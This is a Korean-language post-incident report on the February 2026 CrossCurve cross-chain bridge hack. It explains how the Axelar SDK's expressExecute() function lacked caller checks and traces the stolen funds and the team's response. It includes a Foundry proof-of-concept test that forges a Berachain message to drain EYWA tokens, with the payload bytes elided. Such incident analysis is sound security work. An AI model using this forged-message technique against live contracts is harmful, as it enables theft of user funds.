# 0. Summary

| 이름 | 설명 |
| --- | --- |
| **프로젝트** | `CrossCurve (구 EYWA.fi) — Curve 기반 크로스체인 유동성 프로토콜` |
| **해킹 일시** | `2026-02-01 18:38:23 UTC` |
| 체인 | `Ethereum Mainnet (+ BSC, Arbitrum 멀티체인 피해)` |
| 탈취 금액 | `~$3,000,000 (1차) + $140,762 (2차 봇 추가 탈취)` |
| 취약점 | `Access Control — expressExecute() 호출자 검증 부재` |
| 공격 벡터 | `Insecure Interface — 공개 함수 직접 호출, 크로스체인 메시지 위조` |
| **PoC Status** | `Verified` |
| 추적 | `Ongoing` |
| **Github** | **`incident/2026-02-01_CrossCurve`** |

---

# 1. General Info

### **`Hacked Date`**

*2026-02-01 18:38:23 (UTC)*

### **`Project`**

*CrossCurve (구 EYWA.fi) — Curve 기반 크로스체인 유동성 프로토콜*

### `Chain`

*Ethereum Mainnet (+ BSC, Arbitrum 등 멀티체인 피해)*

### `Amount`

*~$3,000,000 (1차) + $140,762 (2차 봇 추가 탈취)*

### `Attack Vector`

Axelar GMP SDK v5.10.0의 `AxelarExpressExecutable` 컨트랙트에서 `expressExecute()` 함수에 호출자 검증이 없었음.
공격자가 위조된 `sourceChain`, `sourceAddress`, `payload`로 직접 호출하여 Gateway 검증을 우회하고 PortalV2에서 토큰 unlock.

### `Brief Summary of the Attack`

- Axelar GMP SDK의 `expressExecute()`는 원래 릴레이어 확인 전 빠른 실행을 위한 기능이나, 호출자 검증(msg.sender) 로직이 없어 누구나 호출 가능했음. 공격자는 위조된 Berachain 크로스체인 메시지로 ReceiverAxelar → PortalV2.unlock() 경로를 통해 ~10억 EYWA 토큰을 탈취.
- The `expressExecute()` function in Axelar's GMP SDK was designed for fast pre-execution before relayer confirmation, but lacked caller verification. The attacker crafted a fake cross-chain message from "berachain" and directly invoked `expressExecute()`, bypassing gateway validation. This triggered ReceiverAxelar → PortalV2.unlock(), draining ~1B EYWA tokens.

---

# 2. Proof of Concept (PoC) & Exploit

### `2.1 Exploit Transaction`

- **Tx Hash:** [`0x37d9b911ef710be851a2e08e1cfc61c2544db0f208faeade29ee98cc7506ccc2`](https://etherscan.io/tx/0x37d9b911ef710be851a2e08e1cfc61c2544db0f208faeade29ee98cc7506ccc2)
- **Signer / Attacker Address:** `0x632400F42e96A5DEB547a179ca46b02C22CD25cD`
- **Target Contract (Axelar Executor):** `0xB2185950F5A0A46687ac331916508aadA202e063`
- **EYWA Token:** `0x8cb8C4263EB26b2349d74ea2cB1B27bc40709e12`
- **Fake Source (Berachain):** `0x5eEdDcE72530e4fC96d43E3d70Fe09aD0D037175`
- **Block:** 24363854
- **Gas Used:** 618,071

### **`2.2 Vulnerability Analysis`**

- **원인 코드:** `AxelarExpressExecutable.expressExecute()` — `msg.sender` 검증 없이 누구나 호출 가능

```
정상 흐름:
  Axelar Gateway → validateContractCall() → execute() → PortalV2.unlock()
  (게이트웨이가 메시지 출처를 검증)

공격 흐름:
  공격자 EOA → expressExecute() → PortalV2.unlock()
  (게이트웨이 검증 우회, 누구나 직접 호출 가능)
```

- `expressExecute`의 설계 결함:
  1. **공개 호출 가능**: 누구나 `expressExecute(commandId, sourceChain, sourceAddress, payload)`를 호출 가능
  2. **Gateway 검증 스킵**: 정상 `execute()`와 달리, gateway의 `validateContractCall()`을 호출하지 않음
  3. **Payload 위조 가능**: `sourceChain`, `sourceAddress`, `payload`를 공격자가 임의로 조작 가능

### **`2.3 공격 매커니즘`**

```
1. 공격자가 악의적 payload를 조작
   - sourceChain: "berachain" (위조)
   - sourceAddress: 0x5eEdDcE7... (peers에 등록된 주소와 일치)
   - payload: PortalV2.unlock()을 트리거하는 데이터

2. Axelar Executor (0xB218...)의 expressExecute() 직접 호출
   - Gateway 검증 없이 즉시 실행됨

3. ReceiverAxelar가 payload를 디코딩 → PortalV2.resume() → unlock() 호출

4. PortalV2에서 공격자에게 토큰 전송
   - ~999,787,453 EYWA → 공격자
   - ~99,989 EYWA → Treasury (수수료)

5. 반복하여 다른 체인(BSC, Arbitrum)의 자산도 탈취
```

### **`2.4 PoC`**

- **Repository:** `test/2026-02-01_CrossCurve/PoC_template.t.sol`
- **실행:** `forge test --match-path test/2026-02-01_CrossCurve/PoC_template.t.sol -vvvv`
- **결과:** ✅ PASS — EYWA 999,787,453개 탈취 재현

```solidity
contract PoC_crosscurve is IncidentBase {
    function setUp() public override {
        super.setUp();
        beneficiary = address(this);
    }

    function testExploit() public exploit {
        addVulnerability(VulnerabilityType.ACCESS_CONTROL);
        addAttackVector(AttackVector.INSECURE_INTERFACE);
        addMitigation(Mitigation.ACCESS_CONTROL);

        uint256 eywaBalanceBefore = eywa.balanceOf(address(this));

        // 커스텀 commandId (원본 리플레이가 아님을 증명)
        bytes32 commandId = keccak256("crosscurve-poc-test");
        string memory sourceChain = "berachain";
        string memory sourceAddress = "0x5eEdDcE72530e4fC96d43E3d70Fe09aD0D037175";

        // 공격 tx에서 추출한 원본 payload (수신자를 address(this)로 패치)
        bytes memory payload = hex"..."; // 원본 payload
        _patchRecipient(payload, address(this)); // 바이트 오프셋 804에서 수신자 교체

        // 핵심: 누구나 호출 가능 — msg.sender 검증 없음
        executor.expressExecute(commandId, sourceChain, sourceAddress, payload);

        uint256 eywaBalanceAfter = eywa.balanceOf(address(this));
        if (eywaBalanceAfter > eywaBalanceBefore) {
            addProfit(EYWA_TOKEN, eywaBalanceAfter - eywaBalanceBefore);
        }
    }
}
```

---

# 3. Security Audit & Post-Incident

### `3.1 Pre-Incident Audit`

- Date : 미확인
- Firms : 미확인
- Scope : Axelar GMP SDK v5.10.0 (expressExecute 포함 여부 미확인)
- Reports : 미확인

### **`3.2 Post-Mortem & Team Response`**

- **Official Statement** : [CrossCurve 공식 확인](https://x.com/crosscurvefi/status/2018063302199488687)
- **Post-Mortem Date** : *2026-02-05 (MixBytes 기술 분석 공개)*
- **Key Details** :
    - MixBytes가 Axelar GMP SDK v5.10.0의 설계 결함 지적
    - expressExecute()에 호출자 검증이 없어 누구나 크로스체인 메시지를 위조 가능
    - 브릿지 긴급 중단, EYWA 토큰 동결 (XT거래소 협조)

### **`3.3 Compensation Plan (보상안)`**

- **Status** : `Announced`
- **Details** :
    - Treasury Grant Program(TGP) 발표 (2026-02-06)
    - 프로토콜 수익 + 재단 토큰 3년 락업으로 복구 계획
    - 10% 화이트햇 바운티 제안 (72시간 기한, 2/2 공지)

### 사후 대응 타임라인

| 날짜 | 행동 |
|---|---|
| 2/1 | @DefimonAlerts 경고, 커뮤니티 최초 감지 |
| 2/2 | CrossCurve 공식 확인, 브릿지 긴급 중단, 10% 바운티 제안 |
| 2/2 | EYWA 토큰 동결 (XT거래소), Arbitrum EYWA 안전 확인 |
| 2/3 | 탈취 금액 상세 공개 |
| 2/4 | 봇에 의한 추가 탈취 $140,762 공개 |
| 2/5 | MixBytes 기술 분석 — Axelar GMP SDK v5.10.0 설계 결함 |
| 2/6 | TGP 복구 프로그램 발표 |
| 2/13 | Aggregator 서비스 재개, Token/Consensus 브릿지 여전히 중단 |

---

# 4. Fund Tracing

### **`4.1 Flow Chart / Path`**

`[흐름]` Attacker EOA (0x6324...) → expressExecute → PortalV2.unlock → EYWA Token → Swap/Mixer

### `4.2 Details`

| **Step** | **Address / Entity** | **Amount** | **Date** | **Note** |
| --- | --- | --- | --- | --- |
| **Exploiter** | `0x632400F42e96A5DEB547a179ca46b02C22CD25cD` | ~1B EYWA + $3M 기타 | 2026-02-01 | 최초 탈취 |
| **2차 봇** | 미확인 | $140,762 | 2026-02-04 | 추가 봇 탈취 |
| **동결** | XT 거래소 | EYWA 토큰 일부 | 2026-02-02 | 거래소 협조 동결 |
- Related Transactions : [`0x37d9b911...`](https://etherscan.io/tx/0x37d9b911ef710be851a2e08e1cfc61c2544db0f208faeade29ee98cc7506ccc2)
- Last Updated Time : *2026-02-16 23:00:00 (UTC)*

---

# 5. Info

- [DefimonAlerts 최초 경고](https://x.com/DefimonAlerts/status/2018055069762240741)
- [CrossCurve 공식 확인](https://x.com/crosscurvefi/status/2018063302199488687)
- [자금 반환 요청 (10% 바운티)](https://x.com/crosscurvefi/status/2018091623909835018)
- [토큰 보완 조치](https://x.com/crosscurvefi/status/2018245440693477778)
- [탈취 금액 상세 공개](https://x.com/crosscurvefi/status/2018350044001321401)
- [추가 봇 탈취 공개](https://x.com/crosscurvefi/status/2018710180867850659)
- [MixBytes 기술 분석](https://x.com/MixBytes/status/2019096786325983527)
- [TGP 복구 프로그램](https://x.com/crosscurvefi/status/2019475142594744611)
- [서비스 재개](https://x.com/crosscurvefi/status/2022244125702021379)
- [Etherscan Tx](https://etherscan.io/tx/0x37d9b911ef710be851a2e08e1cfc61c2544db0f208faeade29ee98cc7506ccc2)
